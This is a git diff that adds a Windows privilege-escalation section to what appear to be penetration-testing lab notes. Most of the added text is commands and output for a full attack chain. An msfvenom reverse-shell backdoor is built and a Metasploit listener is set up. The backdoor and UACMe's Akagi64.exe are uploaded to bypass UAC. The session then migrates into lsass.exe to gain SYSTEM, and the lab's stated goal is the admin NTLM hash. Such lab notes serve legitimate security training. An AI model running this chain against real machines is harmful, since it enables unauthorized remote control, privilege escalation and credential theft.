@@ -13,6 +13,9 @@
   - Exploiting WinRM    
   
 - [Windows Privilege Escalation](#Windows Privilege Escalation)
+  - Windows Kernel Exploits    
+  - Bypassing UAC With UACMe    
+
 - [Windows File System Vulnerabilities](#Windows File System Vulnerabilities)
 - [Windows Credential Dumping](#Windows Credential Dumping)
 - [Linux Vulnerabilities](#Linux Vulnerabilities)
@@ -1147,7 +1150,7 @@ run
 https://github.com/AonCyberLabs/Windows-Exploit-Suggester
 ./Windows-Exploit-Suggester.py --update
 perform systeminfo on the target machine and copy the output in a file
-./Windows-Exploit-Suggester.py --database 212121.xls --systeminfo sys.txt
+./Windows-Exploit-Suggester.py --database 212121.xls --systeminfo sysinfo.txt
 ```
 
 
@@ -1155,6 +1158,370 @@ perform systeminfo on the target machine and copy the output in a file
 
 
 ---
+
+
+
+
+
+
+
+```
+
+UAC
+net users >> get list of users
+net localgroup administrators >> membets of localgroup administrators group
+
+```
+
+
+
+#### UAC (User Account Control)
+
+<img src="./assets/5.png" style="zoom:150%;" />
+
+- User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.
+- UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group.
+- A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent prompt.
+- Attacks can bypass UAC in order to execute malicious executables with elevated privileges.
+
+
+
+#### Bypassing UAC With UACMe    
+
+- In order to successfully bypass UAC, we will need to have access to a user account that is a part of the `local administrators group` on the Windows target system.
+- UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.
+- UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.
+- There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique used will depend on the version of Windows running on the target system.
+- UACMe is an open source, robust privilege escalation tool developed by @hfire0x. It can be used to bypass Windows UAC by leveraging various techniques.
+  - GitHub: https://github.com/hfiref0x/UACME
+- The UACME GitHub repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10.
+- It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool.
+- The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target
+
+
+
+i have a session with user `admin` who is a member of `administrators` group  
+
+```bash
+msf6 exploit(windows/http/rejetto_hfs_exec) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information            Connection
+  --  ----  ----                     -----------            ----------
+  1         meterpreter x86/windows  VICTIM\admin @ VICTIM  10.10.22.2:4444 -> 10.4.23.226:49387 (10.4.23.226)
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > sessions 1
+[*] Starting interaction with 1...
+
+======================================================
+migrate from x86 meterpreter to x64 meterpreter
+======================================================
+meterpreter > sysinfo 
+Computer        : VICTIM
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter > pgrep explorer
+2956
+meterpreter > migrate 2956
+[*] Migrating from 1816 to 2956...
+[*] Migration completed successfully.
+meterpreter > sysinfo 
+Computer        : VICTIM
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+
+meterpreter > getuid 
+Server username: VICTIM\admin
+
+meterpreter > shell
+Process 992 created.
+Channel 2 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net users
+net users
+
+User accounts for \\VICTIM
+
+-------------------------------------------------------------------------------
+admin                    Administrator            Guest                    
+The command completed successfully.
+
+
+C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>whoami
+whoami
+victim\admin
+
+======================================================
+the user "admin" is one of local administrators group
+======================================================
+C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net localgroup administrators
+net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+admin
+Administrator
+The command completed successfully.
+
+
+C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
+
+
+```
+
+this user can execute commands and programs with elevated privileges  but in order to do that you will need to bypass UAC
+
+
+
+**get privileges of the current user **
+
+```bash
+meterpreter > getprivs 
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeChangeNotifyPrivilege
+SeIncreaseWorkingSetPrivilege
+SeShutdownPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+```
+
+
+
+the command is denied because of the UAC
+
+```
+C:\Windows\system32>net user admin password123
+net user admin password123
+System error 5 has occurred.
+
+Access is denied.
+
+```
+
+
+
+```bash
+
+======================================================
+create msfvenom payload
+======================================================
+root@attackdefense:~/Desktop/tools/UACME# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.80.2 LPORT=1234 -f exe > backdoor.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+
+
+
+======================================================
+set the listener
+======================================================
+msf6 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.80.2
+LHOST => 10.10.80.2
+msf6 exploit(multi/handler) > set LPORT 1234
+LPORT => 1234
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.80.2:1234 
+
+
+
+
+================================================================================================================================
+run Akagi64.exe with key 23 on the current msf session to bypass UAC and run the backdoor with administrative privillages
+================================================================================================================================
+meterpreter > mkdir Temp
+Creating directory: Temp
+meterpreter > cd Temp 
+meterpreter > upload Desktop/tools/UACME/backdoor.exe
+[*] uploading  : /root/Desktop/tools/UACME/backdoor.exe -> backdoor.exe
+[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/Desktop/tools/UACME/backdoor.exe -> backdoor.exe
+[*] uploaded   : /root/Desktop/tools/UACME/backdoor.exe -> backdoor.exe
+meterpreter > upload Desktop/tools/UACME/Akagi64.exe
+[*] uploading  : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
+[*] Uploaded 194.50 KiB of 194.50 KiB (100.0%): /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
+[*] uploaded   : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
+
+meterpreter > shell
+Process 2404 created.
+Channel 4 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Temp>dir 	
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is AEDF-99BD
+
+ Directory of C:\Temp
+
+01/17/2024  05:52 PM    <DIR>          .
+01/17/2024  05:52 PM    <DIR>          ..
+01/17/2024  05:52 PM           199,168 Akagi64.exe
+01/17/2024  05:52 PM            73,802 backdoor.exe
+               2 File(s)        272,970 bytes
+               2 Dir(s)   8,285,016,064 bytes free
+
+C:\Temp>.\Akagi64.exe 23 C:\Temp\backdoor.exe
+.\Akagi64.exe 23 C:\Temp\backdoor.exe
+
+C:\Temp>
+
+
+
+
+================================================================================================================================
+we got a new meterpreter session with elevated privillages 
+================================================================================================================================
+[*] Started reverse TCP handler on 10.10.80.2:1234 
+[*] Sending stage (175174 bytes) to 10.4.20.207
+[*] Meterpreter session 1 opened (10.10.80.2:1234 -> 10.4.20.207:49402) at 2024-01-17 23:37:55 +0530
+
+meterpreter > sysinfo
+Computer        : VICTIM
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter > getuid
+Server username: VICTIM\admin
+meterpreter > getprivs 
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+```
+
+
+
+now we can migrate to any process that has `NT AUTHORITY\SYSTEM ` privillage
+
+```bash
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]                                                   
+ 4     0     System                x64   0                                      
+ 156   3036  backdoor.exe          x86   1        VICTIM\admin                  C:\Temp\backdoor.exe
+ 364   4     smss.exe              x64   0                                      
+ 468   676   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 676   592   services.exe          x64   0                                      
+ 684   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
+
+meterpreter > sysinfo 
+Computer        : VICTIM
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter > migrate 684
+[*] Migrating from 156 to 684...
+[*] Migration completed successfully.
+meterpreter > sysinfo 
+Computer        : VICTIM
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+
+meterpreter > getuid 
+Server username: NT AUTHORITY\SYSTEM
+
+```
+
+
+
+
+
+```
+A Kali GUI machine and a target machine running a vulnerable server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 
+
+Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module.
+
+Then, bypass UACusing the UACME tool. 
+
+UACME:
+
+    Defeat Windows User Account Control (UAC) and get Administrator privileges.
+    It abuses the built-in Windows AutoElevate executables.
+    It has 65+ methods that can be used by the user to bypass UAC depending on the Windows OS version.
+    Developed by https://twitter.com/hFireF0X
+    Written majorly in C, with some code in C++
+
+Objective:Gain the highest privilege on the compromised machine and get admin user NTLM hash.
+
+Instructions:
+
+    Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
+    The IP address of the target machine is mentioned in the file “/root/Desktop/target”
+    Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1
+
+```
+
+
+
+
 
 
 
